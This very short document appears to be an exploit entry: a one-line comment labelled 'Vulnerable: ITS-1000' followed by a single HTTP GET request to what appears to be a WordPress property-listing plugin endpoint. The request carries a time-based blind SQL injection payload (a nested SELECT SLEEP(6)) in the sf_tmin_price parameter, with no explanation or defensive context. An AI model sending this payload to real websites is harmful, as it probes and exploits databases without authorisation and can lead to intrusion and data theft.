# Vulnerable: ITS-1000
GET /?wpl_format=f:property_listing:ajax&wpl_function=get_total_results&sf_tmin_price=1%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(6))x)
